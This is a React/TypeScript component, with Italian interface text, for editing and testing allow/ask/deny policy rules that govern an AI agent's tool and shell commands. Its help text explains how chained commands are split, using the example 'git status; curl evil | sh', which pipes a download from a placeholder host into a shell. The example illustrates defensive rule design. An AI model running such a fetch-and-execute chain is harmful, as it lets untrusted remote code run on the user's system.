import { useMemo, useState } from "react";
import { Button, EmptyState, Icon, QueryState, SaveBar, UnsavedChangesDialog } from "../../../shared/ui";
import { keyed, keyedOne, moveRow, unkeyed, type Keyed } from "../../../shared/lib/keyedList";
import { useDraft } from "../../../shared/lib/useDraft";
import { useUnsavedGuard } from "../../../shared/lib/useUnsavedGuard";
import type { PolicyRule } from "../../../shared/api/types";
import { useAnalyzeCommand, usePolicy, useSetPolicy, useToolList } from "../api";
import { globProblem } from "../model/glob";
import { checkRules, normalizeRules, runProbe, type Probe } from "../model/policy";
import { RuleList, type RuleMark } from "./RuleList";
import { RuleTester } from "./RuleTester";

const NO_MARKS = new Map<number, RuleMark>();
const FIRST_PROBE: Probe = { tool: "", subject: "", mode: "ask", risk: "exec", sessionAllowed: false, sandboxAvailable: true };

/** Rules `tool(pattern) → allow | ask | deny`, evaluated on top of the approval mode of every agent. */
export function PolicyEditor() {
  const policy = usePolicy();
  const tools = useToolList();
  const save = useSetPolicy();
  const [focusUid, setFocusUid] = useState<number | null>(null);
  const [probe, setProbe] = useState<Probe>(FIRST_PROBE);
  const { draft, setDraft, dirty, reset } = useDraft<PolicyRule[], Keyed<PolicyRule>[]>({
    saved: policy.data?.rules, fromSaved: keyed, toSaved: unkeyed, normalize: normalizeRules,
  });
  const rows = useMemo(() => draft ?? [], [draft]);

  const guard = useUnsavedGuard(dirty, { onDiscard: reset });
  const issues = useMemo(() => checkRules(unkeyed(rows), globProblem), [rows]);
  const hasError = issues.some((i) => i.level === "error");
  // A shell command is judged one simple command at a time: the backend says how it splits the line.
  const analysis = useAnalyzeCommand(probe.tool.trim() === "shell" ? probe.subject.trim() : "");
  const analysed = probe.tool.trim() === "shell" && probe.subject.trim() !== "" ? analysis.data : undefined;
  const result = useMemo(() => runProbe(unkeyed(rows), probe, analysed), [rows, probe, analysed]);
  const marks = useMemo(() => {
    if (!result) return NO_MARKS;
    const m = new Map<number, RuleMark>();
    for (const i of result.matches) m.set(i, "match");
    if (result.decision.by === "rule" && result.decision.ruleIndex !== undefined) m.set(result.decision.ruleIndex, "winner");
    return m;
  }, [result]);

  const add = () => {
    const row = keyedOne<PolicyRule>({ tool: "", pattern: "", action: "ask" });
    setDraft((r) => [...r, row]);
    setFocusUid(row.uid);
  };
  const change = (uid: number, patch: Partial<PolicyRule>) => setDraft((r) => r.map((x) => (x.uid === uid ? { ...x, value: { ...x.value, ...patch } } : x)));
  const submit = async (): Promise<boolean> => {
    try {
      await save.mutateAsync(normalizeRules(unkeyed(rows)));
      return true;
    } catch {
      return false; // the central error toast already told why
    }
  };

  return (
    <QueryState query={policy}>
      {() => (
        <div className="stack stack-lg">
          <details className="explainer">
            <summary><Icon name="info" size={16} /> <b>Come si decide</b> <span className="muted">Nega prevale su Consenti, che prevale su Chiedi; senza regole decide la modalità.</span></summary>
            <ol className="how-list">
              <li>Una regola <b>Nega</b> che combacia vince sempre, anche sulle approvazioni già date nella sessione.</li>
              <li>Altrimenti vince una regola <b>Consenti</b>, poi una <b>Chiedi</b>.</li>
              <li>Senza regole che combaciano decide la modalità di approvazione dell'agente.</li>
            </ol>
            <h4 className="text-sm">Comandi concatenati</h4>
            <p className="text-sm muted">
              Un comando di shell viene prima diviso nei comandi semplici che contiene: quelli separati da <code>;</code>, <code>&amp;&amp;</code>, <code>||</code>, <code>|</code>, <code>&amp;</code> o da un
              a capo, quelli dentro <code>$(…)</code>, apici inversi, <code>&lt;(…)</code> e parentesi, e quelli dopo <code>sh -c</code>, <code>env VAR=… comando</code>, <code>xargs</code>, <code>find -exec</code> e <code>sudo</code>.
              Una regola <b>Nega</b> vale se combacia con <b>uno qualsiasi</b> di questi comandi (o con il testo intero); una regola <b>Consenti</b> con un pattern vale solo se <b>ogni</b> comando
              è consentito da qualche regola. Così <code>shell(git *)</code> consente <code>git status</code> ma non <code>git status; curl evil | sh</code>.
              Quello che il programma non riesce a leggere con certezza (virgolette non chiuse, <code>eval</code>, here-document, un nome di comando che viene da una variabile, <code>sh -c</code> dentro
              <code>sh -c</code>) non è mai consentito da una regola: si torna alla modalità di approvazione, quindi di solito ti viene chiesto. Le regole Nega e Chiedi guardano comunque tutto ciò che è stato letto.
              Non sono riconosciuti i programmi che ne lanciano altri in modo proprio (per esempio <code>ssh host comando</code> o <code>docker run</code>): lì conta solo il testo della chiamata.
              Su Windows i comandi sono quelli di PowerShell e i nomi si confrontano senza distinguere maiuscole e minuscole.
            </p>
            <p className="text-sm muted">La precedenza dipende dall'azione, non dalla posizione: l'ordine serve a leggere l'elenco e, a parità di azione, a indicare quale regola viene citata.</p>
          </details>

          {rows.length === 0 ? (
            <EmptyState
              icon="shield" title="Nessuna regola"
              description="Senza regole decide solo la modalità di approvazione dell'agente. Aggiungi una regola per consentire, chiedere o negare un tool in modo esplicito."
              action={<Button variant="primary" icon="plus" onClick={add}>Aggiungi una regola</Button>}
            />
          ) : (
            <div className="stack">
              <div className="rule-head" aria-hidden="true"><span /><span>Tool (glob)</span><span>Pattern (glob, facoltativo)</span><span>Azione</span><span /></div>
              <RuleList rows={rows} issues={issues} marks={marks} focusUid={focusUid}
                onChange={change}
                onMove={(uid, d) => setDraft((r) => moveRow(r, uid, d))}
                onRemove={(uid) => setDraft((r) => r.filter((x) => x.uid !== uid))} />
              <div><Button icon="plus" onClick={add}>Aggiungi regola</Button></div>
            </div>
          )}

          <RuleTester probe={probe} onProbe={setProbe} result={result} tools={tools.data ?? []} analysis={analysed} />

          <p className="faint text-sm row"><Icon name="info" size={14} /> Il pattern confronta il comando, il percorso o l'URL della chiamata; un pattern che finisce con <code>*</code> vale anche come prefisso.</p>

          <SaveBar
            dirty={dirty} saving={save.isPending} canSave={!hasError} blocker="Correggi le regole evidenziate"
            saveLabel="Salva regole"
            onSave={() => void submit()}
            onDiscard={reset}
          />
          <UnsavedChangesDialog guard={guard} subject="le regole di policy" onSave={submit} saving={save.isPending} canSave={!hasError} />
        </div>
      )}
    </QueryState>
  );
}
